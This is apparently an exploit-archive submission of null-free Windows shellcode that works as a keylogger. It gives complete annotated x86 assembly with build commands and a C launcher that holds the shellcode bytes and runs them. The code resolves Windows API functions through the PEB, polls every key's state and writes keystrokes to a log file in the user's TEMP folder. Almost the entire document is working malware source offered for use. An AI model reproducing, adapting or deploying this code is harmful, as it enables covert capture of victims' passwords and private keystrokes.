/*
; Exploit Title: All windows null free shellcode - functional keylogger to file - 601 (0x0259) bytes
; Date: Sat May  7 19:32:08 GMT 2016
; Exploit Author: Fugu
; Vendor Homepage: www.microsoft.com
; Version: all afaik
; Tested on: Win7 (im guessing it will work on others)
; Note: it will write to "log.bin" in the users %TEMP% directory.
;       keystrokes are saved in format: "Virtual-Key Codes", from
;       msdn.microsoft.com website
; nasm -f win32 test.asm && i686-w64-mingw32-ld -o test.exe test.obj
; |STACK| (at the main loop)
; 00000000 Location of bool array
; 00000000 |
; 00000000 |
; 00000000 |
; 00000000 |
; 00000000 |
; 00000000 |
; 00000000 V_
; (FILE HANDLE)
; KERNEL32.lstrcatA
; KERNEL32.Sleep
; KERNEL32.GetEnvironmentVariableA
; KERNEL32.CreateFileA
; KERNEL32.WriteFileA
; user32.GetKeyState
; user32.7EC00000
; KERNEL32.LoadLibraryA
; KERNEL32.GetModuleHandleA
; KERNEL32.GetProcAddress
; KERNEL32.7B410000
section .bss

section .data

section .text
   global _start
      _start:
    cld  								; 00000000 FC
    xor edx,edx  							; 00000001 31D2
    mov dl,0x30  							; 00000003 B230
    push dword [fs:edx]  						; 00000005 64FF32
    pop edx  								; 00000008 5A
    mov edx,[edx+0xc]  							; 00000009 8B520C
    mov edx,[edx+0x14]  						; 0000000C 8B5214
loc_fh:
    mov esi,[edx+0x28]  						; 0000000F 8B7228
    xor eax,eax  							; 00000012 31C0
    mov ecx,eax  							; 00000014 89C1
    mov cl,0x3  							; 00000016 B103
loc_18h:
    lodsb  								; 00000018 AC
    rol eax,byte 0x8  							; 00000019 C1C008
    lodsb  								; 0000001C AC
    loop loc_18h  							; 0000001D E2F9
    lodsb  								; 0000001F AC
    cmp eax,0x4b45524e  						; 00000020 3D4E52454B
    jz loc_2ch  							; 00000025 7405
    cmp eax,0x6b65726e  						; 00000027 3D6E72656B
loc_2ch:
    mov ebx,[edx+0x10]  						; 0000002C 8B5A10
    mov edx,[edx]  							; 0000002F 8B12
    jnz loc_fh  							; 00000031 75DC
    mov edx,[ebx+0x3c]  						; 00000033 8B533C
    add edx,ebx  							; 00000036 01DA
    push dword [edx+0x34]  						; 00000038 FF7234
    mov edx,[edx+0x78]  						; 0000003B 8B5278
    add edx,ebx  							; 0000003E 01DA
    mov esi,[edx+0x20]  						; 00000040 8B7220
    add esi,ebx  							; 00000043 01DE

;GetProcAddress
    xor ecx,ecx  							; 00000045 31C9
loc_47h:
    inc ecx  								; 00000047 41
    lodsd  								; 00000048 AD
    add eax,ebx  							; 00000049 01D8
    cmp dword [eax],0x50746547  					; 0000004B 813847657450
    jnz loc_47h  							; 00000051 75F4
    cmp dword [eax+0x4],0x41636f72  					; 00000053 817804726F6341
    jnz loc_47h  							; 0000005A 75EB
    cmp dword [eax+0x8],0x65726464  					; 0000005C 81780864647265
    jnz loc_47h  							; 00000063 75E2
    dec ecx  								; 00000065 49
    mov esi,[edx+0x24]  						; 00000066 8B7224
    add esi,ebx  							; 00000069 01DE
    mov cx,[esi+ecx*2]  						; 0000006B 668B0C4E
    mov esi,[edx+0x1c]  						; 0000006F 8B721C
    add esi,ebx  							; 00000072 01DE
    mov edx,[esi+ecx*4]  						; 00000074 8B148E
    add edx,ebx  							; 00000077 01DA
    mov edi,edx  							; 00000079 89D7
    push edx  								; 0000007B 52

;GetModuleHandleA
    xor eax,eax  							; 0000007C 31C0
    push eax  								; 0000007E 50
    push dword 0x41656c64  						; 0000007F 68646C6541
    push dword 0x6e614865  						; 00000084 686548616E
    push dword 0x6c75646f  						; 00000089 686F64756C
    push dword 0x4d746547  						; 0000008E 684765744D
    push esp  								; 00000093 54
    push ebx  								; 00000094 53
    call edi  								; 00000095 FFD7
    lea esp,[esp+0x14]  						; 00000097 8D642414
    push eax  								; 0000009B 50

;GetModuleHandleA("USER32.DLL")
    push dword 0x88014c4c  						; 0000009C 684C4C0188
    dec byte [esp+0x2]  						; 000000A1 FE4C2402
    push dword 0x442e3233  						; 000000A5 6833322E44
    push dword 0x52455355  						; 000000AA 6855534552
    push esp  								; 000000AF 54
    call eax  								; 000000B0 FFD0
    xor edx,edx  							; 000000B2 31D2
    cmp eax,edx  							; 000000B4 39D0
    jnz loc_f0h  							; 000000B6 7538
    lea esp,[esp+0xc]  							; 000000B8 8D64240C

;LoadLibraryA
    push edx  								; 000000BC 52
    push dword 0x41797261  						; 000000BD 6861727941
    push dword 0x7262694c  						; 000000C2 684C696272
    push dword 0x64616f4c  						; 000000C7 684C6F6164
    push esp  								; 000000CC 54
    push ebx  								; 000000CD 53
    call edi  								; 000000CE FFD7
    lea esp,[esp+0x10]  						; 000000D0 8D642410
    push eax  								; 000000D4 50

;LoadLibraryA("USER32.DLL")
    push dword 0x77014c4c  						; 000000D5 684C4C0177
    dec byte [esp+0x2]  						; 000000DA FE4C2402
    push dword 0x442e3233  						; 000000DE 6833322E44
    push dword 0x52455355  						; 000000E3 6855534552
    push esp  								; 000000E8 54
    call eax  								; 000000E9 FFD0
    lea esp,[esp+0xc]  							; 000000EB 8D64240C
    push eax  								; 000000EF 50

;GetKeyState
loc_f0h:
    mov edx,eax  							; 000000F0 89C2
    push dword 0x1657461  						; 000000F2 6861746501
    dec byte [esp+0x3]  						; 000000F7 FE4C2403
    push dword 0x74537965  						; 000000FB 6865795374
    push dword 0x4b746547  						; 00000100 684765744B
    push esp  								; 00000105 54
    push edx  								; 00000106 52
    call edi  								; 00000107 FFD7
    lea esp,[esp+0xc]  							; 00000109 8D64240C
    push eax  								; 0000010D 50

;WriteFile
    push dword 0x55010165  						; 0000010E 6865010155
    dec byte [esp+0x1]  						; 00000113 FE4C2401
    push dword 0x6c694665  						; 00000117 686546696C
    push dword 0x74697257  						; 0000011C 6857726974
    push esp  								; 00000121 54
    push ebx  								; 00000122 53
    call edi  								; 00000123 FFD7
    lea esp,[esp+0xc]  							; 00000125 8D64240C
    push eax  								; 00000129 50

;CreateFileA
    push dword 0x141656c  						; 0000012A 686C654101
    dec byte [esp+0x3]  						; 0000012F FE4C2403
    push dword 0x69466574  						; 00000133 6874654669
    push dword 0x61657243  						; 00000138 6843726561
    push esp  								; 0000013D 54
    push ebx  								; 0000013E 53
    call edi  								; 0000013F FFD7
    lea esp,[esp+0xc]  							; 00000141 8D64240C
    push eax  								; 00000145 50

;GetEnvironmentVariableA
    push dword 0x141656c  						; 00000146 686C654101
    dec byte [esp+0x3]  						; 0000014B FE4C2403
    push dword 0x62616972  						; 0000014F 6872696162
    push dword 0x6156746e  						; 00000154 686E745661
    push dword 0x656d6e6f  						; 00000159 686F6E6D65
    push dword 0x7269766e  						; 0000015E 686E766972
    push dword 0x45746547  						; 00000163 6847657445
    push esp  								; 00000168 54
    push ebx  								; 00000169 53
    call edi  								; 0000016A FFD7
    lea esp,[esp+0x18]  						; 0000016C 8D642418
    push eax  								; 00000170 50

;Sleep
    push byte +0x70  							; 00000171 6A70
    push dword 0x65656c53  						; 00000173 68536C6565
    push esp  								; 00000178 54
    push ebx  								; 00000179 53
    call edi  								; 0000017A FFD7
    lea esp,[esp+0x8]  							; 0000017C 8D642408
    push eax  								; 00000180 50

;lstrcatA
    push edx  								; 00000181 52
    push dword 0x41746163  						; 00000182 6863617441
    push dword 0x7274736c  						; 00000187 686C737472
    push esp  								; 0000018C 54
    push ebx  								; 0000018D 53
    call edi  								; 0000018E FFD7
    lea esp,[esp+0xc]  							; 00000190 8D64240C
    push eax  								; 00000194 50

;GetEnvironmentVariableA("TEMP");
    xor ecx,ecx  							; 00000195 31C9
    mov cl,0xe  							; 00000197 B10E
loc_199h:
    push ecx  								; 00000199 51
    loop loc_199h  							; 0000019A E2FD
    push ecx  								; 0000019C 51
    push dword 0x504d4554  						; 0000019D 6854454D50
    mov ecx,esp  							; 000001A2 89E1
    push byte +0x40  							; 000001A4 6A40
    push ecx  								; 000001A6 51
    push ecx  								; 000001A7 51
    call dword [esp+0x54]  						; 000001A8 FF542454
    mov edx,esp  							; 000001AC 89E2

;"\log.bin"
    push byte +0x1  							; 000001AE 6A01
    dec byte [esp]  							; 000001B0 FE0C24
    push dword 0x6e69622e  						; 000001B3 682E62696E
    push dword 0x676f6c5c  						; 000001B8 685C6C6F67
    mov ecx,esp  							; 000001BD 89E1
    push ecx  								; 000001BF 51
    push edx  								; 000001C0 52
    call dword [esp+0x54]  						; 000001C1 FF542454

;CreateFileA("%TEMP%\log.bin")
    xor ecx,ecx  							; 000001C5 31C9
    push ecx  								; 000001C7 51
    push ecx  								; 000001C8 51
    add byte [esp],0x80  						; 000001C9 80042480
    push byte +0x4  							; 000001CD 6A04
    push ecx  								; 000001CF 51
    push byte +0x2  							; 000001D0 6A02
    push ecx  								; 000001D2 51
    add byte [esp],0x4  						; 000001D3 80042404
    push eax  								; 000001D7 50
    call dword [esp+0x74]  						; 000001D8 FF542474
    lea esp,[esp+0x4c]  						; 000001DC 8D64244C
    push eax  								; 000001E0 50
    xor ecx,ecx  							; 000001E1 31C9
    mov esi,ecx  							; 000001E3 89CE
    mov cl,0x8  							; 000001E5 B108
loc_1e7h:
    push esi  								; 000001E7 56
    loop loc_1e7h  							; 000001E8 E2FD

;main loop
loc_1eah:
    xor ecx,ecx  							; 000001EA 31C9
    xor esi,esi  							; 000001EC 31F6
    push byte +0x8  							; 000001EE 6A08
    call dword [esp+0x2c]  						; 000001F0 FF54242C
loc_1f4h:
    mov eax,esi  							; 000001F4 89F0
    cmp al,0xff  							; 000001F6 3CFF
    jnc loc_1eah  							; 000001F8 73F0
    inc esi  								; 000001FA 46
    push esi  								; 000001FB 56
    call dword [esp+0x3c]  						; 000001FC FF54243C
    mov edx,esi  							; 00000200 89F2
    xor ecx,ecx  							; 00000202 31C9
    mov cl,0x80  							; 00000204 B180
    and eax,ecx  							; 00000206 21C8
    xor ecx,ecx  							; 00000208 31C9
    cmp eax,ecx  							; 0000020A 39C8
    jnz loc_21eh  							; 0000020C 7510

;GetKeyState false
;set bool array index zero
    xor edx,edx  							; 0000020E 31D2
    mov ecx,edx  							; 00000210 89D1
    mov eax,esi  							; 00000212 89F0
    mov cl,0x20  							; 00000214 B120
    div ecx  								; 00000216 F7F1
    btr [esp+eax*4],edx  						; 00000218 0FB31484
    jmp short loc_1f4h  						; 0000021C EBD6

;GetKeyState true
;check bool array
;if bool true, skip
;if bool false, set bool true, write to file
loc_21eh:
    xor edx,edx  							; 0000021E 31D2
    mov ecx,edx  							; 00000220 89D1
    mov eax,esi  							; 00000222 89F0
    mov cl,0x20  							; 00000224 B120
    div ecx  								; 00000226 F7F1
    bt [esp+eax*4],edx  						; 00000228 0FA31484
    jc loc_1f4h  							; 0000022C 72C6

    xor edx,edx  							; 0000022E 31D2
    mov ecx,edx  							; 00000230 89D1
    mov eax,esi  							; 00000232 89F0
    mov cl,0x20  							; 00000234 B120
    div ecx  								; 00000236 F7F1
    bts [esp+eax*4],edx  						; 00000238 0FAB1484

    xor ecx,ecx  							; 0000023C 31C9
    push esi  								; 0000023E 56
    push ecx  								; 0000023F 51
    lea ecx,[esp]  							; 00000240 8D0C24
    push ecx  								; 00000243 51
    push byte +0x1  							; 00000244 6A01
    lea ecx,[esp+0xc]  							; 00000246 8D4C240C
    push ecx  								; 0000024A 51
    push dword [esp+0x34]  						; 0000024B FF742434
    call dword [esp+0x4c]  						; 0000024F FF54244C
    lea esp,[esp+0x4]  							; 00000253 8D642404
    jmp short loc_1eah  						; 00000257 EB91
*/
#include <stdio.h>
#include <string.h>

unsigned char sc[] = "\xfc\x31\xd2\xb2\x30\x64\xff\x32\x5a\x8b\x52\x0c\x8b\x52\x14\x8b"
		"\x72\x28\x31\xc0\x89\xc1\xb1\x03\xac\xc1\xc0\x08\xac\xe2\xf9\xac"
		"\x3d\x4e\x52\x45\x4b\x74\x05\x3d\x6e\x72\x65\x6b\x8b\x5a\x10\x8b"
		"\x12\x75\xdc\x8b\x53\x3c\x01\xda\xff\x72\x34\x8b\x52\x78\x01\xda"
		"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74"
		"\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64"
		"\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b"
		"\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd7\x52\x31\xc0\x50\x68"
		"\x64\x6c\x65\x41\x68\x65\x48\x61\x6e\x68\x6f\x64\x75\x6c\x68\x47"
		"\x65\x74\x4d\x54\x53\xff\xd7\x8d\x64\x24\x14\x50\x68\x4c\x4c\x01"
		"\x88\xfe\x4c\x24\x02\x68\x33\x32\x2e\x44\x68\x55\x53\x45\x52\x54"
		"\xff\xd0\x31\xd2\x39\xd0\x75\x38\x8d\x64\x24\x0c\x52\x68\x61\x72"
		"\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd7"
		"\x8d\x64\x24\x10\x50\x68\x4c\x4c\x01\x77\xfe\x4c\x24\x02\x68\x33"
		"\x32\x2e\x44\x68\x55\x53\x45\x52\x54\xff\xd0\x8d\x64\x24\x0c\x50"
		"\x89\xc2\x68\x61\x74\x65\x01\xfe\x4c\x24\x03\x68\x65\x79\x53\x74"
		"\x68\x47\x65\x74\x4b\x54\x52\xff\xd7\x8d\x64\x24\x0c\x50\x68\x65"
		"\x01\x01\x55\xfe\x4c\x24\x01\x68\x65\x46\x69\x6c\x68\x57\x72\x69"
		"\x74\x54\x53\xff\xd7\x8d\x64\x24\x0c\x50\x68\x6c\x65\x41\x01\xfe"
		"\x4c\x24\x03\x68\x74\x65\x46\x69\x68\x43\x72\x65\x61\x54\x53\xff"
		"\xd7\x8d\x64\x24\x0c\x50\x68\x6c\x65\x41\x01\xfe\x4c\x24\x03\x68"
		"\x72\x69\x61\x62\x68\x6e\x74\x56\x61\x68\x6f\x6e\x6d\x65\x68\x6e"
		"\x76\x69\x72\x68\x47\x65\x74\x45\x54\x53\xff\xd7\x8d\x64\x24\x18"
		"\x50\x6a\x70\x68\x53\x6c\x65\x65\x54\x53\xff\xd7\x8d\x64\x24\x08"
		"\x50\x52\x68\x63\x61\x74\x41\x68\x6c\x73\x74\x72\x54\x53\xff\xd7"
		"\x8d\x64\x24\x0c\x50\x31\xc9\xb1\x0e\x51\xe2\xfd\x51\x68\x54\x45"
		"\x4d\x50\x89\xe1\x6a\x40\x51\x51\xff\x54\x24\x54\x89\xe2\x6a\x01"
		"\xfe\x0c\x24\x68\x2e\x62\x69\x6e\x68\x5c\x6c\x6f\x67\x89\xe1\x51"
		"\x52\xff\x54\x24\x54\x31\xc9\x51\x51\x80\x04\x24\x80\x6a\x04\x51"
		"\x6a\x02\x51\x80\x04\x24\x04\x50\xff\x54\x24\x74\x8d\x64\x24\x4c"
		"\x50\x31\xc9\x89\xce\xb1\x08\x56\xe2\xfd\x31\xc9\x31\xf6\x6a\x08"
		"\xff\x54\x24\x2c\x89\xf0\x3c\xff\x73\xf0\x46\x56\xff\x54\x24\x3c"
		"\x89\xf2\x31\xc9\xb1\x80\x21\xc8\x31\xc9\x39\xc8\x75\x10\x31\xd2"
		"\x89\xd1\x89\xf0\xb1\x20\xf7\xf1\x0f\xb3\x14\x84\xeb\xd6\x31\xd2"
		"\x89\xd1\x89\xf0\xb1\x20\xf7\xf1\x0f\xa3\x14\x84\x72\xc6\x31\xd2"
		"\x89\xd1\x89\xf0\xb1\x20\xf7\xf1\x0f\xab\x14\x84\x31\xc9\x56\x51"
		"\x8d\x0c\x24\x51\x6a\x01\x8d\x4c\x24\x0c\x51\xff\x74\x24\x34\xff"
		"\x54\x24\x4c\x8d\x64\x24\x04\xeb\x91";

int main(int argc, char *argv[]){
	printf("Shellcode length: %d\n", (int)strlen(sc));
	(*(void(*)(void))&sc)();
	return 0;
}